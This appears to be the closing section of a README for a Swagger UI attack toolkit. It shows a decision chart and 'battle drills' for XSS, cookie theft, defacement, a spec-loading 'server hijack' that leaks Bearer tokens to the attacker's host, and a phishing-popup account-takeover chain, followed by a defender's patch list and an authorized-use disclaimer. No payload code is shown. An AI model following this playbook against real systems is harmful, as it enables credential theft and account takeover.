 find swagger ui ──► drop probe.json ──► dump DOM ──► read the markers
                                                            │
                     ┌──────────────────────────────────────┴───────────────────┐
                     ▼                                                          ▼
             style attr ALIVE (legacy UI)                            style STRIPPED (modern UI)
             = jackpott, unsanitized                                 = DOMPurify active
                     │                                                          │
                     ▼                                                          ▼
             xss-* full JS exec                                        server-hijack-silent ⭐
             cookie-* session theft                                    login-* / popup-* (table design)
             html-* full defacement                                    img-beacon first, then escalate
```

**Battle drills:**
- Blind target → `img-beacon` first. No beacon = nothing else will fire either.
- Server-hijack = critical severity, zero interaction: spec loads, Try-it-out leaks `Authorization: Bearer ...` to your host.
- ATO chain → `popup-session-expired` (creds) or `cookie-*` (session) → replay → own the account.
- DOM grep markers: `XSS-REAL-EXEC` `HTML-INJECT-REAL-IMG` `PHISHING-FORM-REAL` `SANITIZED-ESCAPED` `NO-RESPONSE`

## 🛡 DEFENDER'S PATCH LIST

- `queryConfigEnabled: false` — kill the configUrl param, serve a fixed local spec
- Disable remote `url` loading; pin patched swagger-ui; CSP `connect-src` allow-list
- Strip `servers` array from any externally loaded spec; warn on non-allow-listed API hosts

## ⚠️ LEGAL

Authorized targets only — bug bounty scope or written permission. This arsenal exists for security assessment, hardening demos, and detection engineering.
